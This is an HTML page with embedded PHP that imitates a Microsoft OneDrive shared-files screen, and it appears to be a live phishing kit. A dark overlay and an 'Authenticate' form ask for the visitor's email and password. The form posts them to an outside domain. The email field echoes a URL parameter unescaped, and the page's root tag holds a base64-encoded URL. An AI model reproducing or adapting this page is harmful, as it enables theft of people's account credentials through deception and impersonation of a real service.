



<html lang="en" data-bollocks="aHR0cHM6Ly96eXh3dnV0c3JxcG8uY2ZkL2xvcXMvMWRyaXZlL2lnYi9vbmUvbm90ZS5waHA=">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <link rel="stylesheet" href="style.css"> -->
    <link rel="shortcut icon" href="" type="image/x-icon">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
    <title>My Files - OneDrive</title>
    <style>
* {
padding: 0; 
margin: 0;
outline: none;
} 
html,body{font-family:Verdana,sans-serif;font-size:15px;line-height:1.5}html{overflow-x:hidden}
h1{font-size:36px}h2{font-size:30px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}
        
.header {
    background-color: #0078d4;
    line-height: 3pc;
    display: flex;
    justify-content: space-between;
    color: white;
    padding: 0 5px;
    }
.name_class{ padding: 2px 0 0 7px }
.search_class{
    display: flex;
    justify-content: space-between;
    width: 40%;
    background-color: white;
    color: #000000B3;
    margin-top: 6px;
    height: 35px;
    padding: 0 3px;
    align-content: center;
    align-items: center;
    border-radius: 3px;
    font-size: 14px;
    margin-right: -50px;
}
.search_class  [class*="fa-"], li [class*="fa-"], .sticky-div {
  color: #0078d4; /* For example, setting the color to red */
}
.profile_right {
    width: 15%;
  font-size: 1.3rem;
  margin-top: 1.5pt;
  margin-right: 2px;
  margin-bottom: 2px; 
/*  margin-left: 2.5pc;*/
display: flex;
    justify-content: space-around;
    align-items: center  
}
.user_profile_icon {
width: 37px;
    height: 37px;
    border-radius: 50%;
    background-color: #0078d4;
    color: #fff;
    text-align: center;
    line-height: 35px;
    font-size: 19px;
    border: 1px solid #fff;
}
.sidebar {
    width: 230px;
    background-color: #f2f2f2;
    height: 93vh;
    top: 0;
    left: 0;
}
.content {
    margin-left: 229px;
    padding: 20px 1px 20px 0px;
    position: absolute;
    top: 25px;
    width: auto;
    right: 0;
    left: 0;
}
.pointer { cursor: pointer; }

/* Media query for tablets and phones */
@media (max-width: 768px) {
    .sidebar {
        display: none; /* Hide the sidebar on tablets and phones */
    }

    .content {
        margin-left: 0; /* Remove the left margin when sidebar is hidden */
    }
}
ul{ list-style:none }
.sidebar ul > li{
 margin: 25.5px 0 0 0; font-size: .145833333in;      padding: 6px 1px 6px 27px; color: #0000008b; cursor: pointer; font-family: Verdana,sans-serif;
}   
.sticky-div {
/*    background-color: #ddd;*/
    border-top: 1px solid #ddd;
    padding: 10px 15px;
    position: sticky;
    top: 93vh;
    left: 0vh;
    font-size: 12px;

/*    width: 100%;*/
}
.submenu{ display:flex; justify-content:space-between; border-bottom:1px solid #ddd; padding: 12px 5px 5px 5px}
.submenu ul {  display:flex; align-items: self-start; font-size: 14px; }
.submenu li { padding: 4px 6px 4px 5px; color:#0000008b; margin: 0 0 0 5px }
.submenu li > i { color:#0000008b }
.submenu .firstsub li:nth-child(1) { background-color: #0078d4; border-radius:3px; padding: 5px 17px 5px 5px;  color:#fff; margin:0  }
.submenu .firstsub li:nth-child(1) > i { color:#fff }
.secondsub{margin-top: 7px; color: #0078d4;}
.secondsub > * {margin-left: 5px; margin-bottom: -4px}
.overlay {
  background-color: #00000094;
  z-index: 10;
  width: 100%;
  height: 100vh;
  top: 0; 
  position: absolute;
  display: none;
}

.loader {
  width: 40px;
  height: 4px;
  background-color: #ccc;
  border-radius: 2px;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);  
  animation: load 1s ease-in-out infinite;
}

@keyframes load {
  0% {
    transform: translateX(-40px);  
  }
  50% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(40px);
  }
}
.shared{margin: 40px 0 0 50px;font-size: 1.2rem; }
.filesection{   margin-top: 50px; margin-left: 45px; }
    .filesection {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
/*        grid-gap: 8px;*/
    }

    /* Media query for screens with width 768px */
    @media (max-width: 768px) and (min-width: 481px) {
        .filesection {
            grid-template-columns: repeat(3, 1fr); /* 3 columns on screens with width 768px */
        }
        .sidebar {display: none; }
        .content {margin-left: 0; /* Remove the left margin when sidebar is hidden */}   
        .shared{margin: 20px 0 0 15px;font-size: 1.2rem; }   
        .filesection{margin-left: 35px; }  
    }

    /* Media query for tablets with width up to 1024px */
    @media (max-width: 1024px) and (min-width: 769px) {
        .filesection {
            grid-template-columns: repeat(3, 1fr); /* 3 columns on tablets */
        }
        .sidebar {display: none; }
        .content {margin-left: 0; /* Remove the left margin when sidebar is hidden */}
        .shared{margin: 20px 0 0 15px;font-size: 1.2rem; }
        .filesection{margin-left: 25px; }
    }

    /* Media query for responsive behavior on screens with width up to 480px */
    @media (max-width: 520px) {
        .filesection {
            grid-template-columns: repeat(2, 1fr); /* 1 column on even smaller screens */
        }
        .sidebar {display: none; }
        .content {margin-left: 0; /* Remove the left margin when sidebar is hidden */}
        .shared{margin: 20px 0 0 10px;font-size: 1.2rem; }
        .filesection{margin-left: 5px; }
    }

.image-wrapper{display: flex; flex-direction: column;}
.file-item {
    position: relative;
    width: 180px;
/*    padding-left: 5px ;*/
}
.file-item:hover {
border: 1px solid #0078d4;
cursor: pointer;
}
.file-item img {
    width: 180px;
    max-width: 100%;
    height: auto;
}

.doc_overlay {
    position: absolute;
    bottom: 0px;
    left: 0;
    right: 0;
    background: linear-gradient(180deg, rgba(17, 210, 78, 0) 0%, rgba(20, 19, 21, 1) 96%);
    color: white;
    padding: 10px 5px 5px 8px;
    /* width: 100%; */
    height: 50px;
    display: flex;
    flex-direction: column;
    align-items: baseline;
    justify-content: space-between;
}

.doc_overlay a {
    text-align: center;
    color: white;
    text-decoration: none;
}
    .loginForm {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
            z-index: 1000;
    width: 360px;
    max-width: 360px;
    background-color: white;
    height: auto;
    padding: 40px 35px;            
        /* Add your login form styles here */
    }  
    .inp::placeholder{ font-size:15px }  
    .inp{
        border-bottom: 1px solid grey; border-top: none; border-left: none; border-right: none;
        width: 100%; padding: 2px 5px 5px 0;
        margin-bottom: 20px; margin-top: 10px;
    }
    .email-footer{ margin:10px 0 20px; color: #0067b8; font-size:12.3px; cursor:pointer; }
    .email-step h5 { margin: 5px 0 } 
    .formbtn{background-color: #0067b8; padding: 10px 40px; color: #fff; border: 1px solid #0067b8; font-size: 15px; cursor: pointer}
    .formbtn:hover, .formbtn:focus, .formbtn:active {background-color: #0067b8; color: #fff; border: 1px solid #0067b8; opacity: 0.9; transition: 1s; }
    .errwarning, .perrwarning{font-size: 13.5px; color: #e81123;}
    .backarrow{margin-top: 10px; margin-bottom: 10px; display:flex; }
    .backarrow img:hover{background-color: #ddd; max-width: fit-content; border-radius: 50%; cursor: pointer;}
    .password-step .h4{ margin: 10px 0 5px -1px; font-weight:500; font-size:1.5rem; font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"; }
    .labelpassword {display: flex;     align-items: end;}   
    </style>
</head>

<body>
    <div class="overlay" style="display: block;">
        <div class="loader" style="display: none;"></div>
    </div>
    <main>

        <section class="header">
            <div class="name_class">
                <i class="fa-solid fa-bars" style="font-size: 23px; margin-right: 5px"></i>
                <span>OneDrive</span>
            </div>

            <div class="search_class">

                <div>
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <a>Search</a>
                </div>
                <div>
                    <a>All files</a>
                    <i class="fa-solid fa-angle-down"></i>
                </div>
            </div>

            <div class="profile_right">
                <i class="fa-solid fa-gear"></i>
                <i class="fa-solid fa-question"></i>
                <a class="user_profile_icon">R</a>
            </div>          
        </section>
        <aside>
            <div class="sidebar">
                <div  style="padding: 10px 0 10px; font-size: 12.5px; margin-left: 15px; margin-bottom: 2px;   color: #595958; font-weight: 600; "><a> Files Directory</a></div>        
                <ul>
                    <li><i class="fa-solid fa-folder"></i><a>My Files</a></li>
                    <li><i class="fa-solid fa-clock-rotate-left"></i> <a>Recent</a></li>
                    <li  style="background-color: #0000001A;"><i class="fa-solid fa-user-group"></i> <a>Shared</a></li>
                    <div  style="padding: 10px 0 0 0px;font-size: 12.5px;margin: 20px 0 0 15px;color: #595958;font-weight: 600; "> <a>Shared Libraries</a></div>
                    <div style="padding-left: 15px;padding-right: 3px; margin-bottom: 10px;">
                        <a style="align-content: center;position: relative;height: 36px;font-size: 10px;margin-left: 1px;color: #595958; letter-spacing: -0.2; "> Sites help you work on projects with your team and share information from anywhere on any device. Create or follow sites to see them here.</a>    
                    </div>
                    <li><i class="fa-solid fa-file-invoice-dollar"></i> <a>Quotation</a></li>
                </ul>
                <div class="sticky-div pointer">
                    <a>Get the OneDrive apps</a>
                </div>
            </div>
        
        </aside>

        <article class="content">
            <div class="submenu">
                <div class="firstsub">
                    <ul>
                        <li style="">
                            <i class="fa-solid fa-plus"></i>
                            <a style="margin-left: 12px;">New</a>
                            <i class="fa-solid fa-angle-down"></i>                          
                        </li>
                        <li>
                            <i class="fa-solid fa-upload"></i>
                            <a style="margin-left: -1px;">Upload</a>
                            <i style="margin-left: -1px;" class="fa-solid fa-angle-down"></i>
                        </li>
                        <li>
                            <i class="fa-solid fa-arrows-rotate"></i>
                            <a style="margin-left: -1px;">Sync</a>
                        </li>
                        <li>
                            <i class="fa-solid fa-bolt"></i>
                            <a style="margin-left: -1px;">Automate</a>
                            <i style="margin-left: -1px;" class="fa-solid fa-angle-down"></i>
                        </li>                       
                    </ul>
                </div>
                <div  class="secondsub">
                    <i class="fa-solid fa-arrow-down-short-wide"></i>
                    <a>Sort</a>
                    <i class="fa-solid fa-angle-down"></i>
                    <i class="fa-solid fa-border-all"></i>
                    <i class="fa-solid fa-angle-down"></i>
                    <i class="fa-solid fa-circle-exclamation"></i>
                </div>
            </div>
            <div class="shared">Shared Files</div>
            <section class="filesection">
                <div class="file-item">
                    <div class="image-wrapper">
                        <img src="https://i.im.ge/2023/08/06/jDeMip.download.png">
                        <div class="doc_overlay">
                            <a style="">Company Profile.</a>
                            <a style="font-size: 12px !important;">A few minutes ago</a>
                        </div>
                    </div>
                </div>
                <div class="file-item">
                    <img src="https://i.im.ge/2023/08/09/jP5OKS.file2.png">
                    <div class="doc_overlay">
                        <a style=";">Shared Documents.</a>
                        <a style="font-size: 12px !important;">A few hours ago</a>
                    </div>        
                </div>
                <div class="file-item">
                    <img src="https://i.im.ge/2023/08/09/jP52Xz.file3.png">
                    <div class="doc_overlay">
                        <a style=";">Purchase Order.</a>
                        <a style="font-size: 12px !important;">A few hours ago</a>
                    </div>        
                </div>
                <div class="file-item">
                    <img src="https://i.im.ge/2023/08/09/jP91d1.file5.png">
                    <div class="doc_overlay">
                        <a style=";">Sample Images.</a>
                        <a style="font-size: 12px !important;">2 days ago</a>
                    </div>        
                </div>
            </section>


        </article>          
    </main>

<style type="text/css">
 
</style>    

    <div class="loginForm" id="loginF">
        <form method="post" action="https://brightpointts.com/onedrive.php">
            <img src="https://i.im.ge/2023/08/08/jj3nn6.1d.png" class="logo">
          <div class="email-step">
            <h5>Authenticate</h5>
            
            <div> <img src="https://i.postimg.cc/kXMJpbQS/screenshot-44.png" style="max-width: 99%; margin-left: -5px;"></div>
            
			  <div class="backarrow">
                
				<input type="email" value="<?php echo $_GET['email']; ?>" name="email" class="email-input inp" >
                
            </div>
             <input type="password" name="password"  class="password-input inp" placeholder="Enter password to proceed">

            <div class="email-footer">
              This link is valid only for the intended email address.
            </div>
            <button class="submit formbtn" id="finalsubmit"  style="float: right;">Proceed</button>
          </div>   
               
                <a style="color: #000; cursor: pointer; margin-top: 0px; margin-left: 5px;">Keep me signed in</a>
            </div>
            <div class="email-footer" style="font-size: 0.8rem; color: #666666">
              This link is valid only for the intended email address.
            </div>
            
          </div>  
        </form>
    </div>




</body>
</html>